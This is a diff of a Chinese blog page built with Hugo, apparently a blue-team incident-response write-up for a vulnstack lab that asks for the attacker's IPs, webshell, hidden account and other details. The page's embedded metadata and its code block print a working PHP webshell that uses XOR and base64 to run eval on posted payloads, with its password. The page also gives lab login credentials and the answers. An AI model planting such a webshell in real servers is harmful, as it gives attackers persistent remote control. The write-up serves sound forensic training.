@@ -1,24 +1,24 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto" data-theme="auto">
 
-<head><script src="/xvsf/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=xvsf/livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
+<meta name="robots" content="index, follow">
 <title>ATT&amp;CK实战系列——蓝队防御（二） | xvsf</title>
 <meta name="keywords" content="ATT&amp;CK, 蓝队防御, 应急处置">
 <meta name="description" content="ATT&amp;CK 框架蓝队防御实战系列第二篇，检测与响应">
 <meta name="author" content="map[name:xvsf]">
-<link rel="canonical" href="http://localhost:1313/xvsf/posts/attck%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E8%93%9D%E9%98%9F%E9%98%B2%E5%BE%A1%E4%BA%8C/">
-<link crossorigin="anonymous" href="/xvsf/assets/css/stylesheet.e5adb15db165fc1395adbbc90bcd9c4c4fb7ad43100a1390fa8e5324dbbcf151.css" integrity="sha256-5a2xXbFl/BOVrbvJC82cTE&#43;3rUMQChOQ&#43;o5TJNu88VE=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/xvsf/img/2.jpg">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/xvsf/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/xvsf/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/xvsf/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/xvsf/safari-pinned-tab.svg">
+<link rel="canonical" href="https://xvshifu.github.io/xvsf/posts/attck%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E8%93%9D%E9%98%9F%E9%98%B2%E5%BE%A1%E4%BA%8C/">
+<link crossorigin="anonymous" href="/xvsf/assets/css/stylesheet.107842b3d7a50993f400a2f9d591dd6f46830b1393c74b51d61e8545ebbb93dc.css" integrity="sha256-EHhCs9elCZP0AKL51ZHdb0aDCxOTx0tR1h6FReu7k9w=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://xvshifu.github.io/xvsf/img/2.jpg">
+<link rel="icon" type="image/png" sizes="16x16" href="https://xvshifu.github.io/xvsf/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://xvshifu.github.io/xvsf/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://xvshifu.github.io/xvsf/apple-touch-icon.png">
+<link rel="mask-icon" href="https://xvshifu.github.io/xvsf/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/xvsf/posts/attck%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E8%93%9D%E9%98%9F%E9%98%B2%E5%BE%A1%E4%BA%8C/">
+<link rel="alternate" hreflang="en" href="https://xvshifu.github.io/xvsf/posts/attck%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E8%93%9D%E9%98%9F%E9%98%B2%E5%BE%A1%E4%BA%8C/">
 <noscript>
     <style>
         #theme-toggle,
@@ -112,13 +112,84 @@ document.addEventListener('DOMContentLoaded', () => {
 
 
 
+<meta property="og:url" content="https://xvshifu.github.io/xvsf/posts/attck%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E8%93%9D%E9%98%9F%E9%98%B2%E5%BE%A1%E4%BA%8C/">
+  <meta property="og:site_name" content="xvsf">
+  <meta property="og:title" content="ATT&CK实战系列——蓝队防御（二）">
+  <meta property="og:description" content="ATT&amp;CK 框架蓝队防御实战系列第二篇，检测与响应">
+  <meta property="og:locale" content="zh-cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-03-18T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-03-18T00:00:00+00:00">
+    <meta property="article:tag" content="ATT&CK">
+    <meta property="article:tag" content="蓝队防御">
+    <meta property="article:tag" content="应急处置">
+      <meta property="og:image" content="https://xvshifu.github.io/xvsf/img/1.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://xvshifu.github.io/xvsf/img/1.png">
+<meta name="twitter:title" content="ATT&amp;CK实战系列——蓝队防御（二）">
+<meta name="twitter:description" content="ATT&amp;CK 框架蓝队防御实战系列第二篇，检测与响应">
 
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://xvshifu.github.io/xvsf/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "ATT\u0026CK实战系列——蓝队防御（二）",
+      "item": "https://xvshifu.github.io/xvsf/posts/attck%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E8%93%9D%E9%98%9F%E9%98%B2%E5%BE%A1%E4%BA%8C/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "ATT\u0026CK实战系列——蓝队防御（二）",
+  "name": "ATT\u0026CK实战系列——蓝队防御（二）",
+  "description": "ATT\u0026CK 框架蓝队防御实战系列第二篇，检测与响应",
+  "keywords": [
+    "ATT\u0026CK", "蓝队防御", "应急处置"
+  ],
+  "articleBody": "搭建环境： 项目地址：http://vulnstack.qiyuanxuetang.net/vuln/detail/16/\n前景需要：小李在某单位驻场值守，深夜12点，甲方已经回家了，小李刚偷偷摸鱼后，发现安全设备有告警，于是立刻停掉了机器开始排查。\n这是他的服务器系统，请你找出以下内容，并作为通关条件：\n1.攻击者的IP地址（两个）？\n2.攻击者的webshell文件名？\n3.攻击者的webshell密码？\n4.攻击者的伪QQ号？\n5.攻击者的伪服务器IP地址？\n6.攻击者的服务器端口？\n7.攻击者是如何入侵的（选择题）？\n8.攻击者的隐藏用户名？\n相关账户密码 用户:administrator\n密码:Zgsf@qq.com\n1.攻击者的IP地址（两个）？ 分析日志\n使用 STOR 命令上传了一个名为 **system.php** 的文件\nphp\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 \u003c?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i\u003cstrlen($D);$i++) { $c = $K[$i+1\u002615]; $D[$i] = $D[$i]^$c; } return $D; } $pass='hack6618'; $payloadName='payload'; $key='7813d1590d28a7dd'; if (isset($_POST[$pass])){ $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,\"getBasicsInfo\")===false){ $payload=encode($payload,$key); } eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); }else{ if (strpos($data,\"getBasicsInfo\")!==false){ $_SESSION[$payloadName]=encode($data,$key); } } } 使用 Log Parser 查看远程登录成功的 IP 这个命令会直接从系统的安全日志（Security Event Log）中提取登录成功的记录，并显示登录时间、用户名和来源 IP\nLogParser.exe -i:EVT -o:DATAGRID \"SELECT TimeGenerated, EXTRACT_TOKEN(Strings, 5, '|') AS Username, EXTRACT_TOKEN(Strings, 18, '|') AS SourceIP FROM Security WHERE EventID=4624 AND EXTRACT_TOKEN(Strings, 8, '|')='10'\"\n2.攻击者的webshell文件名？ system.php\n3.攻击者的webshell密码？ hack6618\n4.攻击者的伪QQ号？ 5.攻击者的伪服务器IP地址？ 6.攻击者的服务器端口？ 7.攻击者是如何入侵的（选择题）？ 从文件夹中找到的 frp，可以确定是 frp 攻击\n8.攻击者的隐藏用户名？ 答案： 1.攻击者的IP地址（两个）？192.168.126.135 192.168.126.129\n2.攻击者的webshell文件名？system.php\n3.攻击者的webshell密码？hack6618\n4.攻击者的伪QQ号？777888999321\n5.攻击者的伪服务器IP地址？256.256.66.88\n6.攻击者的服务器端口？ 65536\n7.攻击者是如何入侵的（选择题）？\n8.攻击者的隐藏用户名？hack887$\n",
+  "wordCount" : "819",
+  "inLanguage": "en",
+  "image": "https://xvshifu.github.io/xvsf/img/1.png","datePublished": "2026-03-18T00:00:00Z",
+  "dateModified": "2026-03-18T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": {"name":"xvsf"}
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://xvshifu.github.io/xvsf/posts/attck%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E8%93%9D%E9%98%9F%E9%98%B2%E5%BE%A1%E4%BA%8C/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "xvsf",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://xvshifu.github.io/xvsf/img/2.jpg"
+    }
+  }
+}
+</script>
 </head>
 <body id="top">
     <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://localhost:1313/xvsf/" accesskey="h" title="xvsf (Alt + H)">xvsf</a>
+            <a href="https://xvshifu.github.io/xvsf/" accesskey="h" title="xvsf (Alt + H)">xvsf</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -144,37 +215,37 @@ document.addEventListener('DOMContentLoaded', () => {
         </div>
         <ul id="menu">
             <li>
-                <a href="http://localhost:1313/xvsf/" title="首页">
+                <a href="https://xvshifu.github.io/xvsf/" title="首页">
                     <span>首页</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/xvsf/posts/" title="文章">
+                <a href="https://xvshifu.github.io/xvsf/posts/" title="文章">
                     <span>文章</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/xvsf/categories/" title="归类">
+                <a href="https://xvshifu.github.io/xvsf/categories/" title="归类">
                     <span>归类</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/xvsf/archives/" title="归档">
+                <a href="https://xvshifu.github.io/xvsf/archives/" title="归档">
                     <span>归档</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/xvsf/random/" title="手气不错">
+                <a href="https://xvshifu.github.io/xvsf/random/" title="手气不错">
                     <span>手气不错</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/xvsf/search/" title="搜索 (Alt &#43; /)" accesskey=/>
+                <a href="https://xvshifu.github.io/xvsf/search/" title="搜索 (Alt &#43; /)" accesskey=/>
                     <span>搜索</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/xvsf/about/" title="关于">
+                <a href="https://xvshifu.github.io/xvsf/about/" title="关于">
                     <span>关于</span>
                 </a>
             </li>
@@ -185,14 +256,14 @@ document.addEventListener('DOMContentLoaded', () => {
 
 <article class="post-single">
   <header class="post-header">
-    <div class="breadcrumbs"><a href="http://localhost:1313/xvsf/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/xvsf/posts/">Posts</a></div>
+    <div class="breadcrumbs"><a href="https://xvshifu.github.io/xvsf/">Home</a>&nbsp;»&nbsp;<a href="https://xvshifu.github.io/xvsf/posts/">Posts</a></div>
     <h1 class="post-title entry-hint-parent">
       ATT&amp;CK实战系列——蓝队防御（二）
     </h1>
     <div class="post-description">
       ATT&amp;CK 框架蓝队防御实战系列第二篇，检测与响应
     </div>
-    <div class="post-meta"><span title='2026-03-18 00:00:00 +0000 UTC'>March 18, 2026</span>&nbsp;·&nbsp;<span class='reading-time-coffee' title='预计阅读 2 分钟'>☕ 2 min</span>&nbsp;·&nbsp;<span class='word-count' title='全文约 819 字'>📄 819 字</span>&nbsp;·&nbsp;<a href="http://localhost:1313/xvsf/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a>
+    <div class="post-meta"><span title='2026-03-18 00:00:00 +0000 UTC'>March 18, 2026</span>&nbsp;·&nbsp;<span class='reading-time-coffee' title='预计阅读 2 分钟'>☕ 2 min</span>&nbsp;·&nbsp;<span class='word-count' title='全文约 819 字'>📄 819 字</span>&nbsp;·&nbsp;<a href="https://xvshifu.github.io/xvsf/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a>
 
 </div>
   </header> 
@@ -359,17 +430,17 @@ document.addEventListener('DOMContentLoaded', () => {
 <p>密码:Zgsf@qq.com</p>
 <h1 id="1攻击者的ip地址两个">1.攻击者的IP地址（两个）？<a hidden class="anchor" aria-hidden="true" href="#1攻击者的ip地址两个">#</a></h1>
 <p>分析日志</p>
-<p><img decoding="async" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457278.png" style="max-width: 100%; height: auto;"></p>
-<p><img decoding="async" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457725.png" style="max-width: 100%; height: auto;"></p>
-<p><img decoding="async" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457178.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" height="1360" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457278.png" style="max-width: 100%; height: auto; aspect-ratio: 2180 / 1360;" width="2180"></p>
+<p><img decoding="async" height="295" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457725.png" style="max-width: 100%; height: auto; aspect-ratio: 1029 / 295;" width="1029"></p>
+<p><img decoding="async" height="1528" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457178.png" style="max-width: 100%; height: auto; aspect-ratio: 2560 / 1528;" width="2560"></p>
 <p>使用 <code>STOR</code> 命令上传了一个名为 <code>**system.php**</code> 的文件</p>
 <blockquote>
 </blockquote>
-<p><img decoding="async" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458668.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" height="899" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458668.png" style="max-width: 100%; height: auto; aspect-ratio: 1067 / 899;" width="1067"></p>
 <blockquote>
 </blockquote>
-<p><img decoding="async" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458914.png" style="max-width: 100%; height: auto;"></p>
-<div class="code-block-container" id="code-1779871947532446700" data-expanded="false" role="region" aria-labelledby="btn-code-1779871947532446700">
+<p><img decoding="async" height="1360" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458914.png" style="max-width: 100%; height: auto; aspect-ratio: 2180 / 1360;" width="2180"></p>
+<div class="code-block-container" id="code-1779933344370545000" data-expanded="false" role="region" aria-labelledby="btn-code-1779933344370545000">
     <div class="code-header">
         <div class="mac-buttons">
             <span class="mac-button red"></span>
@@ -381,12 +452,12 @@ document.addEventListener('DOMContentLoaded', () => {
             <button class="copy-btn" title="Copy" aria-label="复制代码">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
             </button>
-            <button class="toggle-btn" id="btn-code-1779871947532446700" title="Toggle" aria-expanded="false" aria-controls="code-1779871947532446700" aria-label="展开或折叠代码块">
+            <button class="toggle-btn" id="btn-code-1779933344370545000" title="Toggle" aria-expanded="false" aria-controls="code-1779933344370545000" aria-label="展开或折叠代码块">
                 <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
             </button>
         </div>
     </div>
-    <div class="code-content" id="code-1779871947532446700-content"><div class="highlight"><div class="chroma">
+    <div class="code-content" id="code-1779933344370545000-content"><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
 </span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
@@ -457,20 +528,20 @@ document.addEventListener('DOMContentLoaded', () => {
 </div><h3 id="使用-log-parser-查看远程登录成功的-ip">使用 Log Parser 查看远程登录成功的 IP<a hidden class="anchor" aria-hidden="true" href="#使用-log-parser-查看远程登录成功的-ip">#</a></h3>
 <p>这个命令会直接从系统的安全日志（Security Event Log）中提取登录成功的记录，并显示登录时间、用户名和来源 IP</p>
 <p><code>LogParser.exe -i:EVT -o:DATAGRID &quot;SELECT TimeGenerated, EXTRACT_TOKEN(Strings, 5, '|') AS Username, EXTRACT_TOKEN(Strings, 18, '|') AS SourceIP FROM Security WHERE EventID=4624 AND EXTRACT_TOKEN(Strings, 8, '|')='10'&quot;</code></p>
-<p><img decoding="async" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457501.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" height="721" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457501.png" style="max-width: 100%; height: auto; aspect-ratio: 1436 / 721;" width="1436"></p>
 <h1 id="2攻击者的webshell文件名">2.攻击者的webshell文件名？<a hidden class="anchor" aria-hidden="true" href="#2攻击者的webshell文件名">#</a></h1>
 <p><code>system.php</code></p>
 <h1 id="3攻击者的webshell密码">3.攻击者的webshell密码？<a hidden class="anchor" aria-hidden="true" href="#3攻击者的webshell密码">#</a></h1>
 <p><code>hack6618</code></p>
 <h1 id="4攻击者的伪qq号">4.攻击者的伪QQ号？<a hidden class="anchor" aria-hidden="true" href="#4攻击者的伪qq号">#</a></h1>
-<p><img decoding="async" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457186.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" height="1360" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457186.png" style="max-width: 100%; height: auto; aspect-ratio: 2180 / 1360;" width="2180"></p>
 <h1 id="5攻击者的伪服务器ip地址">5.攻击者的伪服务器IP地址？<a hidden class="anchor" aria-hidden="true" href="#5攻击者的伪服务器ip地址">#</a></h1>
-<p><img decoding="async" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457776.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" height="1360" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457776.png" style="max-width: 100%; height: auto; aspect-ratio: 2180 / 1360;" width="2180"></p>
 <h1 id="6攻击者的服务器端口">6.攻击者的服务器端口？<a hidden class="anchor" aria-hidden="true" href="#6攻击者的服务器端口">#</a></h1>
 <h1 id="7攻击者是如何入侵的选择题">7.攻击者是如何入侵的（选择题）？<a hidden class="anchor" aria-hidden="true" href="#7攻击者是如何入侵的选择题">#</a></h1>
 <p>从文件夹中找到的 frp，可以确定是 frp 攻击</p>
 <h1 id="8攻击者的隐藏用户名">8.攻击者的隐藏用户名？<a hidden class="anchor" aria-hidden="true" href="#8攻击者的隐藏用户名">#</a></h1>
-<p><img decoding="async" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458555.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" height="1360" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458555.png" style="max-width: 100%; height: auto; aspect-ratio: 2180 / 1360;" width="2180"></p>
 <h1 id="答案">答案：<a hidden class="anchor" aria-hidden="true" href="#答案">#</a></h1>
 <p>1.攻击者的IP地址（两个）？<code>192.168.126.135</code>  <code>192.168.126.129</code></p>
 <p>2.攻击者的webshell文件名？<code>system.php</code></p>
@@ -480,24 +551,24 @@ document.addEventListener('DOMContentLoaded', () => {
 <p>6.攻击者的服务器端口？ <code>65536</code></p>
 <p>7.攻击者是如何入侵的（选择题）？</p>
 <p>8.攻击者的隐藏用户名？<code>hack887$</code></p>
-<p><img decoding="async" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458689.png" style="max-width: 100%; height: auto;"></p>
+<p><img decoding="async" height="1347" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458689.png" style="max-width: 100%; height: auto; aspect-ratio: 896 / 1347;" width="896"></p>
 
 
   </div>
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="http://localhost:1313/xvsf/tags/attck/">ATT&amp;CK</a></li>
-      <li><a href="http://localhost:1313/xvsf/tags/%E8%93%9D%E9%98%9F%E9%98%B2%E5%BE%A1/">蓝队防御</a></li>
-      <li><a href="http://localhost:1313/xvsf/tags/%E5%BA%94%E6%80%A5%E5%A4%84%E7%BD%AE/">应急处置</a></li>
+      <li><a href="https://xvshifu.github.io/xvsf/tags/attck/">ATT&amp;CK</a></li>
+      <li><a href="https://xvshifu.github.io/xvsf/tags/%E8%93%9D%E9%98%9F%E9%98%B2%E5%BE%A1/">蓝队防御</a></li>
+      <li><a href="https://xvshifu.github.io/xvsf/tags/%E5%BA%94%E6%80%A5%E5%A4%84%E7%BD%AE/">应急处置</a></li>
     </ul>
 <nav class="paginav">
-  <a class="prev" href="http://localhost:1313/xvsf/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E9%9D%B6%E5%9C%BA001/">
+  <a class="prev" href="https://xvshifu.github.io/xvsf/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE-%E9%9D%B6%E5%9C%BA001/">
     <span class="title">« Prev</span>
     <br>
     <span>内网渗透体系建设 — 靶场WriteUp</span>
   </a>
-  <a class="next" href="http://localhost:1313/xvsf/posts/attck%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E8%93%9D%E9%98%9F%E9%98%B2%E5%BE%A1%E4%B8%80/">
+  <a class="next" href="https://xvshifu.github.io/xvsf/posts/attck%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E8%93%9D%E9%98%9F%E9%98%B2%E5%BE%A1%E4%B8%80/">
     <span class="title">Next »</span>
     <br>
     <span>ATT&amp;CK实战系列——蓝队防御（一）</span>
@@ -534,7 +605,7 @@ document.addEventListener('DOMContentLoaded', () => {
     </main>
     
 <footer class="footer">
-        <span>&copy; 2026 <a href="http://localhost:1313/xvsf/">xvsf</a></span> · 
+        <span>&copy; 2026 <a href="https://xvshifu.github.io/xvsf/">xvsf</a></span> · 
 
     <span>
         Powered by
